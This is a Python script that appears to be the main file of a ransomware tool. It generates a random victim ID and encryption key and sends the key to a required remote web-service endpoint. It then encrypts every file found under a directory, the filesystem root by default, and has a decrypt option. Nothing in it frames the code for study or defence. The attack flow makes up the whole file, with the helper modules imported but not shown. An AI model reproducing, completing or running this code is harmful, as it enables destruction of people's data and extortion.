import argparse
import json
import requests
import random
import string

from modules import encryption
from modules import search_files
from modules import info
from datetime import datetime
from modules import create_infos

def get_time():
    today = datetime.now()
    today = today.strftime("%d/%m/%Y %H:%M:%S")

    return today

def generate_random_string(length=16):
    letters = string.ascii_lowercase
    random_string = ''.join(random.choice(letters) for i in range(length))
    return random_string

def main():
    parser = argparse.ArgumentParser(add_help=False, usage=info.help_message)
    parser.add_argument('--dir', dest="directory", default="/")
    parser.add_argument('--key', dest="key", default=None, required=False)
    parser.add_argument('--encrypt', dest="encrypt", action="store_true")
    parser.add_argument('--decrypt', dest="decrypt", action="store_true")
    parser.add_argument('--verbose', dest="verbose", action="store_true")
    parser.add_argument('--web-service', dest="web_service", required=True)

    args = parser.parse_args()

    key = args.key
    directory = args.directory
    encrypt = args.encrypt
    decrypt = args.decrypt
    verbose = args.verbose
    web_service = args.web_service

    target_id = generate_random_string(12)
    infos = create_infos.CreateInfos(target_id)

    if key is None:
        key = generate_random_string()

    infos.send_infos(web_service, key)

    encrypt = encryption.EncryptionData(key)
    files = search_files.SearchDirThree(directory)
    all_files = files.search_all_files()

    info.log("Search all files in {0}\n".format(directory))
    info.log("Started in: {0}".format(get_time()))

    for file in all_files:
        if verbose:
            info.log(file)

        if encrypt:
            encrypt.encrypt(file)

        elif decrypt:
            encrypt.decrypt(file)

    info.log("Stopped in: {0}".format(get_time()))

if __name__=='__main__':
    info.banner()
    main()
